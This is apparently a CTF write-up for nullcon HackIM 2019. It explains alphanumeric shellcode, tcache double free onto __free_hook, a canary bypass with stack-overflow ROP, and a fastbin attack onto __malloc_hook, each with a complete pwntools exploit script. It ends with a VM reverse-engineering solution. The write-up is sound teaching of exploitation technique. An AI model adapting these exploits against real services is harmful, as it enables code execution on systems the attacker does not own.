## easy-shell

The logic is simple, a `RWX` page is allocated from `mmap`, and we can execute
arbitrary codes but contents must be `alphanum`. I used this
[tool](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-
encoder). However, the only problem is that this generator requires `rax` to
be near the `shellcode` and `rax + padding_len == shellcode address`, but
`rax` is `0` when our `shellcode` is executed. Thus, we can add `push r12; pop
rax` in front of our payload and let `padding_len == 3`, which is the length
of `push r12; pop rax`.

```python  
from pwn import *  
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')

sc = '''  
mov rax,%s  
push rax  
mov rdi,rsp  
mov rax,2  
mov rsi,0  
syscall

mov rdi,rax  
sub rsp,0x20  
mov rsi,rsp  
mov rdx,0x20  
mov rax,0  
syscall

mov rdi,0  
mov rsi,rsp  
mov rdx,0x20  
mov rax,1  
syscall

''' % hex(u64(file_name))  
sc = asm(sc)  
print asm("push r12;pop rax;") + alphanum_encoder(sc, 3)  
```

Actually, by the way, `peasy-shell` can be done in the same way: just add more
`push xxx; pop xxx;` to fill first page, and fill the second page with real
payload being generated, which is `RWX`.

## HackIM Shop

A typical UAF and double free challenge. Firstly leak the address in `got`
table to leak `libc` and find its version in `libc-database`, which is `2.27`,
the same one in `Ubuntu 18.04 LTS`. This can be done by UAF and control the
`pointer` field in the `struct`.

Then, since it is `2.27`, the `tcache` is used instead, so we can use `double
free` to poison the `tcache` and `malloc` the chunk onto `__free_hook`, then
rewrite it to `system` to get the shell.

`exp.py`

```python  
from pwn import *  
import json  
g_local=True  
context.log_level='debug'  
p = ELF('./challenge')  
e = ELF("./libc6_2.27.so")  
if g_local:  
	sh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}  
	ONE_GADGET_OFF = 0x4526a  
	UNSORTED_OFF = 0x3c4b78  
	gdb.attach(sh)  
else:  
	ONE_GADGET_OFF = 0x4526a  
	UNSORTED_OFF = 0x3c4b78  
	sh = remote("pwn.ctf.nullcon.net", 4002)  
	#ONE_GADGET_OFF = 0x4557a

def add(name, name_len, price=0):  
	sh.sendline("1")  
	sh.recvuntil("name length: ")  
	sh.sendline(str(name_len))  
	sh.recvuntil("name: ")  
	sh.sendline(name)  
	sh.recvuntil("price: ")  
	sh.sendline(str(price))  
	sh.recvuntil("> ")

def remove(idx):  
	sh.sendline("2")  
	sh.recvuntil("index: ")  
	sh.sendline(str(idx))  
	sh.recvuntil("> ")

def view():  
	sh.sendline("3")  
	ret = sh.recvuntil("{")  
	ret += sh.recvuntil("[")  
	ret += sh.recvuntil("]")  
	ret += sh.recvuntil("}")  
	sh.recvuntil("> ")  
	return ret

add("0", 0x38)  
add("1", 0x68)  
add("2", 0x68)  
remove(0)  
remove(1)  
#0x40 1 -> 0 -> 0 data

fake_struct = p64(0)  
fake_struct += p64(p.got["puts"])  
fake_struct += p64(0) + p8(0)

add(fake_struct, 0x38) #3  
leak = view()  
libc_addr = u64(leak[0x2e:0x2e+6] + '\x00\x00') - e.symbols["puts"]  
print hex(libc_addr)

add("4", 0x68)

#now bins are clear

add("5", 0x68)  
add("/bin/sh\x00", 0x68) #6  
add("/bin/sh\x00", 0x38)  
add("/bin/sh\x00", 0x68)  
add("/bin/sh\x00", 0x68)  
add("/bin/sh\x00", 0x68)  
add("/bin/sh\x00", 0x68)  
add("/bin/sh\x00", 0x68)

remove(5)  
remove(5)  
remove(7) #prevent 0x40 from being used up

add(p64(libc_addr + e.symbols["__free_hook"]), 0x68)

add("consume", 0x68)

gots = ["system"]

fake_got = ""  
for g in gots:  
	fake_got += p64(libc_addr + e.symbols[g])  
add(fake_got, 0x68)

sh.sendline("2")

sh.recvuntil("index: ")  
sh.sendline(str(6))  
sh.interactive()  
```

## babypwn

This challenge *seems* to be a format once string vulnerability, but there is
nothing exploitable. The only address we have without leak is the program
address `0x400000`, but there is nothing writable(neither `got table` nor
`_fini_array`). The only possible write are `stdin` and `stdout`, but they
will not be used before the program exits so it is useless to hijack their
virtual tables.

Then I found another exploitable vulnerability

```c  
if ( (char)uint8 > 20 )  
{  
 perror("Coins that many are not supported :/\r\n");  
 exit(1);  
}  
for ( i = 0; i < uint8; ++i )  
{  
 v6 = &v10[4 * i];  
 _isoc99_scanf((__int64)"%d", (__int64)v6);  
}  
```

The check regard variable `uint8` as an `signed char` but it will be used as
`unsigned char` later, so the value `> 0x7f` will pass the check and cause the
stack overflow.

However, there is canary so we need to bypass this, but we cannot leak it
since vulnerable `printf` is after this stack overflow. The key thing is there
is no check against the return value of `scanf`, so we can let `scanf` to have
some error so that `&v10[4 * i]` will not be rewritten and canary will remain
unchanged. Then after we jump over the canary we can rewrite the return
address and construct ROP chain. But how to make it have error? Initially I
tried `"a"(any letter)`, but this fails, because even if the `scanf` returns
with error in this iteration, it will also return directly with error later on
without receiving any input so we cannot rewrite return address. It seems that
the reason is that `"a"` does not comply the format `"%d"` so it will never be
consumed by this `scanf("%d")`. So can we input something that satisfy format
`"%d"` but still cause the error? I then came up with `"-"`, because `"%d"`
allows negative number so the negative sign should be fine, but a single
negative sign does not make any sense as a number so it will cause error. Then
it works!

Finally the things became easy, just regard this as a normal stack overflow
challenge, and I did not use that format string vulnerability

By the way, the `libc` version can be found by using format string
vulnerability to leak address in `got` table, and search it in the `libc-
database`

```python  
from pwn import *  
import json  
g_local=True  
context.log_level='debug'  
p = ELF('./challenge')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")  
ONE_GADGET_OFF = 0x4526a  
if g_local:  
	sh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}  
	gdb.attach(sh)  
else:  
	sh = remote("pwn.ctf.nullcon.net", 4001)

POP_RDI = p64(0x400a43)  
def exploit_main(rop):  
	sh.recvuntil("tressure box?\r\n")  
	sh.sendline('y')  
	sh.recvuntil("name: ")  
	sh.sendline("2019")  
	sh.recvuntil("do you have?\r\n")  
	sh.sendline("128")

	for i in xrange(0,22):  
		sh.sendline(str(i))  
	for i in xrange(2):  
		sh.sendline('-') #bypass canary  
		sleep(1)  
	for i in xrange(0,len(rop),4):  
		sh.sendline(str(u32(rop[i:i+4])))  
	for i in xrange(0,128-22-2-len(rop)/4):  
		sh.sendline("0")  
	sh.recvuntil("created!\r\n")

rop = ""  
rop += p64(0)  
rop += POP_RDI  
rop += p64(p.got["puts"])  
rop += p64(p.plt["puts"])  
rop += p64(0x400806) #back to main

exploit_main(rop)

libc_addr = u64(sh.recvuntil('\x7f') + '\x00\x00') - e.symbols["puts"]  
print hex(libc_addr)

exploit_main(p64(0) + p64(libc_addr + ONE_GADGET_OFF))

sh.interactive()  
```

## tudutudututu

The program can create a `todo`, set the `description`, delete and print.

The `todo` structure is as shown below

```assembly  
00000000 todo            struc ; (sizeof=0x10, align=0x8, mappedto_6)  
00000000 topic           dq ?                    ; offset  
00000008 description     dq ?                    ; offset  
00000010 todo            ends  
```

The problem is, when creating the `todo` structure, the `description` field is
not initialized. This can create UAF and arbitrary read.

Firstly since there is no PIE, we use arbitrary read to leak the address in
`got` table, here we can also find the `libc` version, which is `2.23`.

Then, because `topic` is freed before `description`, the `description` is on
the top of `topic` in the fast bin if they have same size. In this way if we
allocate `todo` again, the UAF caused by no initialization of `description`
field can give us heap address.

Then control the `description` field to point to a already freed `0x70` chunk,
then set the description to cause double free, which poisons the fast bin and
enable the fast bin attack. We can use `0x7f` trick to `malloc` a chunk onto
`__malloc_hook`, and hijack the `rip` to `one_gadget`. Since buffer on the
stack used to get input is quite large and we can easily set them to `0`, the
condition of `one_gadget` can be easily satisfied.

```python  
from pwn import *  
import json  
g_local=True  
context.log_level='debug'  
p = ELF('./challenge')  
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")  
ONE_GADGET_OFF = 0xf1147  
if g_local:  
	sh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}  
	gdb.attach(sh)  
else:  
	sh = remote("pwn.ctf.nullcon.net", 4003)

sh.recvuntil("> ")

def create(topic):  
	sh.sendline("1")  
	sh.recvuntil("topic: ")  
	sh.sendline(topic)  
	sh.recvuntil("> ")

def set_data(topic, data, data_len):  
	sh.sendline("2")  
	sh.recvuntil("topic: ")  
	sh.sendline(topic)  
	sh.recvuntil("length: ")  
	sh.sendline(str(data_len))  
	sh.recvuntil("Desc: ")  
	sh.sendline(data)  
	sh.recvuntil("> ")

def delete(topic):  
	sh.sendline("3")  
	sh.recvuntil("topic: ")  
	sh.sendline(topic)  
	sh.recvuntil("> ")

def show(topic):  
	sh.sendline("4")  
	sh.recvuntil(topic + " - ")  
	ret = sh.recvuntil('\n')  
	sh.recvuntil("> ")  
	return ret[:-1]  
payload = 'A' * 8 + p64(p.got["puts"])  
create(payload)  
delete(payload)  
#now 0x20 * 2

unitialzed_todo = "unitialized data".ljust(0x30, '_')  
create("consume 0x20".ljust(0x30, '_'))  
create(unitialzed_todo)  
libc_addr = u64(show(unitialzed_todo)[:6] + '\x00\x00') - e.symbols["puts"]  
print hex(libc_addr)

#bins empty

leak_todo = "leak".ljust(0x60, '_')  
create(leak_todo)  
set_data(leak_todo, 'A', 0x60)  
delete(leak_todo)  
create("leak")

heap_addr = u64(show("leak").ljust(8, '\x00')) - 0x10f0  
print hex(heap_addr)

#now 0x70 *2

for i in xrange(3):  
	create("tmp".ljust(0x60, str(i)))  
for i in [1,0,2]:  
	delete("tmp".ljust(0x60, str(i)))

#now 0x20 * 3 + 0x70 * 3

payload = 'A' * 8 + p64(heap_addr + 0x1170)

create(payload)  
delete(payload)

unitialzed_todo = "unitialized data 2".ljust(0x30, '_')  
create("consume 0x20".ljust(0x30, '_'))  
create(unitialzed_todo)

set_data(unitialzed_todo, 'A', 0x10)  
# now 0x70 are poisoned and all others are empty

for i in xrange(4):  
	create("getshell" + str(i))

set_data("getshell0", p64(libc_addr + e.symbols["__malloc_hook"] - 0x23),
0x60)  
set_data("getshell1", 'a', 0x60)  
set_data("getshell2", 'b', 0x60)  
set_data("getshell3".ljust(0x100, '\x00'), '\x00' * 0x13 + p64(libc_addr +
ONE_GADGET_OFF), 0x60)

sh.sendline("1")  
sh.recvuntil("topic: ")  
sh.sendline("123")

sh.interactive()  
```

## rev3al

### Initialization of VM

This is a VM reverse challenge, which is a bit complicated but not very hard;
it is solvable if enough time was spent.

```c  
text = (unsigned int *)mmap(0LL, 0xA00uLL, 3, 34, 0, 0LL);  
if ( text != (unsigned int *)-1LL )  
{  
 mem = (unsigned __int8 *)mmap(0LL, 0x100uLL, 3, 34, 0, 0LL);  
 if ( mem != (unsigned __int8 *)-1LL )  
 {  
   jmp_tab = (unsigned int *)mmap(0LL, 0x100uLL, 3, 34, 0, 0LL);  
   if ( text != (unsigned int *)-1LL )  
   {  
//...  
```

Initially, 3 pages are allocated by `mmap`.

Then input is obtained by `cin`

```c  
input.ptr = input.data;  
input.size = 0LL;  
input.data[0] = 0;  
std::operator<<<std::char_traits<char>>(&std::cout, "Go for it:\n");  
std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin,
&input);  
if ( input.size - 1 > 0xD )             // <= 0xe == 14  
 exit(1);  
```

While the definition of `std::string` in `x86-64 Linux` is

```assembly  
00000000 std::string     struc ; (sizeof=0x20, align=0x8, mappedto_10)  
00000000 ptr             dq ?                    ; XREF: main+BC/w  
00000008 size            dq ?                    ; XREF: main+C0/w  
00000010 data            db 16 dup(?)            ; XREF: main+B8/o  
00000020 std::string     ends  
```

Since the length here is not longer than 16 bytes (<= 14), the last 16 bytes
are always `char array` instead of pointer to heap.

Then `mem` and `jmp_tab` are initialized to 0 in weird but fast way, which are
not important. Then input is copied to `mem+200`, and virtual registers of the
VM is initialized to 0. (I actually found them to be registers later when I
was analyzing the VM)

```c  
qmemcpy(mem + 200, input.ptr, 14uLL);   // input size == 14  
i = 5;  
do  
{  
 a2a = 0;  
 vector::push_back(&regs, &a2a);  
 --i;  
}  
while ( i );  
```

The `regs` are `std::vector`, and each element is `uint8_t`. I found it to be
`std::vector` and the function to be `push_back` by debugging and guessing.
(It is quite unreasonable to reverse the STL lib function)

The definition of `std::vector<uint8_t>` is as shown

```assembly  
00000000 std::vector     struc ; (sizeof=0x18, mappedto_11)  
00000000 ptr             dq ?                    ; XREF: main:loc_1EF3/r  
00000008 end             dq ?                    ; XREF: main+277/w ; offset  
00000010 real_end        dq ?                    ; offset  
00000018 std::vector     ends  
```

Then it is the codes to initialize and run the VM.

```c  
regs.ptr[3] = 0;  
tmp.ptr = tmp.data;  
std::string::assign(&tmp, chal1.ptr, &chal1.ptr[chal1.size]);  
vm_init(&tmp);  
if ( tmp.ptr != tmp.data )  
 operator delete(tmp.ptr);  
vm_run();  
```

`tmp` is also `std::string`, and `std::string::assign` assign the value of
`chal1` to `tmp`. Where is `chal1` defined? By using cross reference in IDA,
we found that it is initialized in function `0x2042`, which is declared in
`_init_array` and will be called before `main` function. Except some basic C++
initialization stuff, it also assign `"chal.o.1"` to `chal1` and assign
`"chal.o.2"` to `chal2`, which are obviously the file names of files being
provided.

Back to the `main` function. In function `vm_init`, it simply loads the file
into `text` memory page. There are many C++ stuff in this function and they
are hard to read, but luckily they are not important so we do not need to
focus on them.

```c++  
std::istream::read(&v5, (char *)text, v2);    // critical step  
```

The logic that cause the correct information to be outputted is easy: after
running first VM `mem[1]` must be true, and after running second VM `mem[2]`
must be true. Even if it can also be the case that `mem[2]` becomes true and
`mem[1]` remains 0 after the first VM, this is not very possible I guess,
otherwise the file `"chal.o.2"` will be useless.

### VM Analysis

The `vm_run` function is as shown

```c  
void __cdecl vm_run()  
{  
 unsigned int *t; // rbx  
 unsigned int j; // ecx  
 unsigned int i; // eax

 t = text;  
 j = 0;  
 i = 0;  
 do  
 {  
   if ( (HIWORD(text[i]) & 0xF) == 0xC )       // high word of each
instruction  
     jmp_tab[j++] = i;                         // record the index of instruction to jmp tab  
   ++i;  
 }  
 while ( i <= 0x3F && j <= 0x3F );  
 bContiue = 1;  
 do  
   one_instr(t[regs.ptr[3]]);  
 while ( bContiue );  
}

void __fastcall one_instr(unsigned int instr)  
{  
 unsigned int high_word; // eax  
 unsigned __int8 dst; // dl  
 unsigned int src; // edi  
 unsigned __int8 *v4; // rdx  
 unsigned __int8 v5; // al  
 unsigned __int8 v6; // cl  
 unsigned __int8 *v7; // rax

 high_word = (instr >> 0x10) & 0xF;  
 dst = instr & 3;  
 src = (instr >> 2) & 3;  
 if ( dst == 3 )  
   dst = 2;  
 if ( (_BYTE)src == 3 )  
   LOBYTE(src) = 2;  
 switch ( (_BYTE)high_word )  
 {  
   case 0:  
     bContiue = 0;  
     break;  
   case 1:  
     if ( regs.ptr[4] )  
       regs.ptr[dst] = mem[regs.ptr[(unsigned __int8)src]] + mem[regs.ptr[dst]];  
     else  
       regs.ptr[dst] += regs.ptr[(unsigned __int8)src];  
     ++regs.ptr[3];  
     break;  
   case 2:  
     if ( regs.ptr[4] )  
       regs.ptr[dst] = mem[regs.ptr[dst]] - mem[regs.ptr[(unsigned __int8)src]];  
     else  
       regs.ptr[dst] -= regs.ptr[(unsigned __int8)src];  
     ++regs.ptr[3];  
     break;  
   case 3:  
     if ( regs.ptr[4] )  
       regs.ptr[dst] = mem[regs.ptr[dst]] * mem[regs.ptr[(unsigned __int8)src]];  
     else  
       regs.ptr[dst] *= regs.ptr[(unsigned __int8)src];  
     ++regs.ptr[3];  
     break;  
   case 4:  
     if ( regs.ptr[4] )  
     {  
       v4 = &regs.ptr[dst];  
       v5 = mem[*v4] / mem[regs.ptr[(unsigned __int8)src]];  
     }  
     else  
     {  
       v4 = &regs.ptr[dst];  
       v5 = *v4 / regs.ptr[(unsigned __int8)src];  
     }  
     *v4 = v5;  
     ++regs.ptr[3];  
     break;  
   case 5:  
     if ( regs.ptr[4] )  
       v6 = mem[regs.ptr[(unsigned __int8)src]];  
     else  
       v6 = regs.ptr[(unsigned __int8)src];  
     regs.ptr[dst] = v6;  
     ++regs.ptr[3];  
     break;  
   case 6:  
     if ( regs.ptr[4] )  
       mem[regs.ptr[dst]] = mem[regs.ptr[(unsigned __int8)src]];  
     else  
       mem[regs.ptr[dst]] = regs.ptr[(unsigned __int8)src];  
     ++regs.ptr[3];  
     break;  
   case 7:  
     regs.ptr[3] = regs.ptr[dst];  
     break;  
   case 8:  
     regs.ptr[4] = (regs.ptr[4] ^ 1) & 1;  
     ++regs.ptr[3];  
     break;  
   case 9:  
     if ( regs.ptr[dst] )  
     {  
       ++regs.ptr[3];  
     }  
     else if ( regs.ptr[4] )  
     {  
       regs.ptr[3] += regs.ptr[(unsigned __int8)src];  
     }  
     else  
     {  
       regs.ptr[3] = regs.ptr[(unsigned __int8)src];  
     }  
     break;  
   case 10:  
     regs.ptr[dst] = src;  
     ++regs.ptr[3];  
     break;  
   case 11:  
     if ( regs.ptr[4] )  
     {  
       v7 = &mem[regs.ptr[dst]];  
       ++*v7;  
     }  
     else  
     {  
       ++regs.ptr[dst];  
     }  
     ++regs.ptr[3];  
     break;  
   case 12:  
     ++regs.ptr[3];  
     break;  
   default:  
     std::operator<<<std::char_traits<char>>(&std::cerr, "Invalid instruction!\n");  
     exit(1);  
     return;  
 }  
}  
```

Each instruction is 4-bytes; there are 4 registers that can be directly
accessed by the VM program; the opcode is 4 bits; `r4` controls a "mode", and
some instructions will perform differently when the `r4` is different.

Then it takes some time to write a [disassembler](disasm.py), and after then
we can disassemble these 2 files to further analyze.

### VM Program Analysis

After generating the assembly codes of this VM, we found that it would use
some operations to produce a specific constant, because the only possible
immediate numbers in this instruction set are `0-3`. It will produce `200` at
the beginning, which is the address of our input, and then store it at address
`0` for further usage. After analyzing a few characters of the input, I found
the pattern that it will load the input character into register, minus it by a
particular number, and compare it with zero. The program will stop if the
result is not zero. My approach is to translate the assembly into Python, and
set the inputs to zero. When comparing the input with zero, we output the
negation of the character, which is the correct input. Here is the translated
[script](1.py).

Note: we need to change all these things:

1. `switch` instruction, which is useless  
2. all arithmetic operation must have a `%0x100` after it  
3. all memory read/write to array accessing  
4. all conditional jumps to print negation of the condition

```  
accessing 200  
w  
accessing 0  
accessing 204  
1  
accessing 0  
accessing 213  
t  
accessing 0  
accessing 201  
h  
accessing 0  
accessing 207  
D  
accessing 0  
accessing 203  
N  
accessing 0  
accessing 210  
k  
accessing 0  
accessing 205  
T  
accessing 0  
accessing 211  
----------86  
`  
accessing 1  
256  
accessing 0  
accessing 206  
s  
accessing 0  
accessing 212  
u  
accessing 0  
accessing 202  
3  
accessing 0  
accessing 208  
4  
```

Then just inspect the output and reconstruct the flag.

But, except character at `[11]`, is `[11] * 2 - 86 == 10`. Since it multiplies
the character by 2, the previous method does not work, so we must solve this
manually, which is `'0'`. This actually takes me some time.

So the final flag is `wh3N1TsD4?k0ut`, while the `?` seems to be any
character.  

Original writeup
(https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-02-01-nullcon-
HackIM/README.md#tudutudututu).